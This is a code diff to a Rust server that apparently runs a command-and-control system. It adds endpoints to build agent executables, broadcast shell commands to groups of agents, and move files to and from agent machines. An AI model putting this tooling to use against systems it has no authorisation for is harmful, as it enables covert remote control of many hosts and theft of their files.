@@ -24,6 +24,8 @@ mod auth;
 mod crypto;
 mod websocket;
 mod tls_util;
+mod build_service;
+mod file_service;
 
 use crate::db::PayloadUpload;
 use db::{Database, AgentMetrics, CommandResult, validate_beacon_interval, DEFAULT_BEACON_INTERVAL_SECS};
@@ -32,7 +34,7 @@ use websocket::{ServerState, dashboard_ws_handler, PendingCommand};
 use logger::{log_info, log_warn};
 
 #[derive(Deserialize, Serialize)]
-struct EncryptedEnvelope {
+pub struct EncryptedEnvelope {
     payload: String,
 }
 
@@ -68,10 +70,57 @@ struct CommandResultData {
 }
 
 #[derive(Deserialize)]
+struct BroadcastRequest {
+    command: String,
+    command_type: Option<String>,
+    filters: BroadcastFilters,
+}
+
+#[derive(Deserialize)]
+struct BroadcastFilters {
+    #[serde(default)]
+    os: Vec<String>,
+    #[serde(default = "default_status_filter")]
+    status: Vec<String>,
+}
+
+fn default_status_filter() -> Vec<String> {
+    vec!["online".to_string()]
+}
+
+fn agent_matches_filters(agent: &db::Agent, filters: &BroadcastFilters) -> bool {
+    if !filters.os.is_empty() {
+        let os_lower = agent.os.to_lowercase();
+        let matches_os = filters.os.iter().any(|f| {
+            let f = f.to_lowercase();
+            os_lower.contains(&f) || (f == "binary" && !os_lower.contains("windows") && !os_lower.contains("linux"))
+        });
+        if !matches_os {
+            return false;
+        }
+    }
+
+    if filters.status.iter().any(|s| s.to_lowercase() == "all") {
+        return true;
+    }
+
+    let status_lower = agent.status.to_lowercase();
+    filters.status.iter().any(|s| s.to_lowercase() == status_lower)
+}
+
+#[derive(Deserialize)]
 struct QueueCommandRequest {
     agent_id: String,
     command_type: String,
     payload: String,
+}
+
+#[derive(Deserialize)]
+struct BuildAgentRequest {
+    target_os: String,
+    server_url: String,
+    psk: String,
+    beacon_interval: u64,
 }
 
 fn extract_bearer_token(headers: &HeaderMap) -> Option<String> {
@@ -163,6 +212,9 @@ async fn main() {
 
     let app = Router::new()
         .route("/api/agents", get(get_agents))
+        .route("/api/agents/build", post(build_agent))
+        .route("/api/agents/builds", get(list_agent_builds))
+        .route("/api/agents/download/:id", get(download_agent_build))
         .route("/api/agents/:id/metrics", get(get_agent_metrics))
         .route("/api/agents/:id/logs", get(get_agent_logs))
         .route("/api/agents/:id/results", get(get_command_results))
@@ -170,8 +222,16 @@ async fn main() {
         .route("/api/beacon", post(receive_beacon))
         .route("/api/result", post(receive_result))
         .route("/api/command/queue", post(queue_command))
+        .route("/api/command/broadcast", post(broadcast_command))
+        .route("/api/command/broadcast/history", get(get_broadcast_history))
         .route("/api/payloads/upload", post(upload_payload))
         .route("/api/payloads/sessions", get(get_payload_sessions))
+        .route("/api/files/upload/:agent_id", post(file_service::initiate_upload_to_agent))
+        .route("/api/files/download/:agent_id", post(file_service::initiate_download_from_agent))
+        .route("/api/files/chunk", post(file_service::receive_agent_chunk))
+        .route("/api/files/agent/:agent_id", get(file_service::list_agent_transfers))
+        .route("/api/files/:transfer_id/chunks/:chunk_index", get(file_service::get_transfer_chunk))
+        .route("/api/files/:transfer_id", get(file_service::get_transfer_status))
         .route("/api/dashboard/ws", get(dashboard_ws_handler))
         .fallback_service(ServeDir::new(dash))
         .layer(CorsLayer::permissive())
@@ -219,6 +279,13 @@ async fn receive_beacon(
         .get_beacon_interval(&data.id)
         .unwrap_or(DEFAULT_BEACON_INTERVAL_SECS);
 
+    let old_status = state
+        .db
+        .get_agents()
+        .ok()
+        .and_then(|agents| agents.into_iter().find(|a| a.id == data.id))
+        .map(|a| a.status);
+
     let agent = db::Agent {
         id: data.id.clone(),
         hostname: hostname.clone(),
@@ -248,6 +315,17 @@ async fn receive_beacon(
             "last_seen": now
         }
     }));
+
+    if old_status.as_deref() != Some("Online") {
+        let _ = state.tx.send(serde_json::json!({
+            "type": "AgentStatusChanged",
+            "payload": {
+                "agent_id": data.id,
+                "old_status": old_status.unwrap_or_else(|| "Unknown".to_string()),
+                "new_status": "Online",
+            }
+        }));
+    }
 
     if let (Some(cpu), Some(mem), Some(disk)) = (data.cpu_usage, data.memory_usage, data.disk_usage) {
         let metrics = AgentMetrics {
@@ -644,6 +722,144 @@ async fn get_payload_sessions(State(state): State<ServerState>) -> Json<Value> {
                 .collect();
             Json(serde_json::json!(sessions))
         }
+        Err(_) => Json(Value::Null),
+    }
+}
+
+async fn build_agent(
+    State(state): State<ServerState>,
+    Json(req): Json<BuildAgentRequest>,
+) -> Result<Json<Value>, StatusCode> {
+    let build_req = build_service::BuildRequest {
+        target_os: req.target_os,
+        server_url: req.server_url,
+        psk: req.psk,
+        beacon_interval: req.beacon_interval,
+    };
+
+    match build_service::start_build(&state, build_req).await {
+        Ok(resp) => Ok(Json(serde_json::to_value(resp).unwrap_or(Value::Null))),
+        Err(e) => {
+            log_warn(&state.db, &state.tx, "Build", None, &format!("Build rejected: {}", e));
+            Err(StatusCode::BAD_REQUEST)
+        }
+    }
+}
+
+async fn list_agent_builds(State(state): State<ServerState>) -> Json<Value> {
+    match build_service::list_builds(&state.db) {
+        Ok(builds) => Json(serde_json::json!(builds)),
+        Err(_) => Json(Value::Null),
+    }
+}
+
+async fn download_agent_build(
+    State(state): State<ServerState>,
+    Path(id): Path<String>,
+) -> Result<axum::response::Response, StatusCode> {
+    let build = state
+        .db
+        .get_agent_build(&id)
+        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+        .ok_or(StatusCode::NOT_FOUND)?;
+
+    if build.status != "completed" {
+        return Err(StatusCode::CONFLICT);
+    }
+
+    let data = tokio::fs::read(&build.file_path)
+        .await
+        .map_err(|_| StatusCode::NOT_FOUND)?;
+
+    let ext = match build.target_os.to_lowercase().as_str() {
+        "windows" => ".exe",
+        "binary" => ".bin",
+        _ => "",
+    };
+    let filename = format!("agent_{}{}", &build.id[..8], ext);
+
+    Ok(axum::response::Response::builder()
+        .status(StatusCode::OK)
+        .header("Content-Type", "application/octet-stream")
+        .header(
+            "Content-Disposition",
+            format!("attachment; filename=\"{}\"", filename),
+        )
+        .body(axum::body::Body::from(data))
+        .unwrap())
+}
+
+async fn broadcast_command(
+    State(state): State<ServerState>,
+    Json(data): Json<BroadcastRequest>,
+) -> Json<Value> {
+    let agents = state.db.get_agents().unwrap_or_default();
+    let matching: Vec<_> = agents
+        .iter()
+        .filter(|a| agent_matches_filters(a, &data.filters))
+        .collect();
+
+    let cmd_type = data.command_type.clone().unwrap_or_else(|| "shell".to_string());
+    let broadcast_id = uuid::Uuid::new_v4().to_string();
+    let now = Utc::now().to_rfc3339();
+    let mut queued = 0usize;
+
+    {
+        let mut queue = state.command_queue.write().await;
+        for agent in &matching {
+            let cmd_id = uuid::Uuid::new_v4().to_string();
+            let command = PendingCommand {
+                id: cmd_id,
+                command_type: cmd_type.clone(),
+                payload: data.command.clone(),
+            };
+            queue.entry(agent.id.clone()).or_default().push(command);
+            queued += 1;
+        }
+    }
+
+    let filters_json = serde_json::to_string(&serde_json::json!({
+        "os": data.filters.os,
+        "status": data.filters.status,
+    }))
+    .unwrap_or_default();
+
+    let record = db::BroadcastHistory {
+        id: broadcast_id.clone(),
+        command: data.command.clone(),
+        filters: filters_json,
+        agent_count: queued as i64,
+        created_at: now,
+    };
+    let _ = state.db.insert_broadcast(&record);
+
+    log_info(
+        &state.db,
+        &state.tx,
+        "Broadcast",
+        None,
+        &format!("Broadcast {} queued for {} agents", broadcast_id, queued),
+    );
+
+    let _ = state.tx.send(serde_json::json!({
+        "type": "BroadcastSent",
+        "payload": {
+            "broadcast_id": broadcast_id,
+            "agent_count": queued,
+            "command": data.command,
+        }
+    }));
+
+    Json(serde_json::json!({
+        "success": true,
+        "broadcast_id": broadcast_id,
+        "agent_count": queued,
+    }))
+}
+
+async fn get_broadcast_history(State(state): State<ServerState>) -> Json<Value> {
+    match state.db.get_broadcast_history(50) {
+        Ok(records) => Json(serde_json::to_value(records).unwrap_or(Value::Null)),
         Err(_) => Json(Value::Null),
     }
 }
